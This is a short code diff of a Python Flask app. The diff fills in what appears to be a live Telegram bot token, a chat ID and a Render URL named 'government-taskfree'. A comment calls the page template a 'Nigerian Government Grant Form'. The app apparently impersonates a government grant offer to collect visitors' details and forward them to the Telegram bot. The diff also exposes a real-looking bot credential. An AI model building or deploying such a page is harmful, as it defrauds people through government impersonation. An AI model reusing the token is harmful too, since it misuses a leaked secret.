@@ -6,9 +6,9 @@ from urllib.parse import urlparse
 app = Flask(__name__)
 
 # REPLACE THESE WITH YOUR VALUES
-BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
-CHAT_ID = "YOUR_CHAT_ID_HERE"
-BASE_URL = "https://your-app.onrender.com"  # Render will give you this
+BOT_TOKEN = "8242963598:AAEhMbTy6FwYAL027cNDIH6WhNIVSyog_SA"
+CHAT_ID = "8374631511"
+BASE_URL = "https://government-taskfree.onrender.com"  # Render will give you this
 
 # HTML Template (Nigerian Government Grant Form)
 HTML_TEMPLATE = """
